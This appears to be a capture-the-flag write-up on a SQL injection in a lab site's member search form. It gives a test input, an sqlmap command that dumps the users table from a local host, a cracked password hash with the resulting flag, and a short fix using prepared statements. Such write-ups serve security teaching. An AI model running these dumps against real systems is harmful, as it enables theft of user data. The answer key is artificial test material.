# 02_inject_me_member

The GET parameter in the member search form is vulnerable.

## Method

Go to ?page=member
In the search field, search `1 AND 1=1`

## How to exploit
sqlmap -u "http://192.168.1.75/index.php?page=member&id=3&Submit=Submit#" --dump -T users

Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28         

5ff9d0165b4f92b14994e5c685cdce28
FortyTwo 
fortytwo 
10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5


## Solution

- Send form as POST request
- Add prepared statements to backend to prevent SQL injection
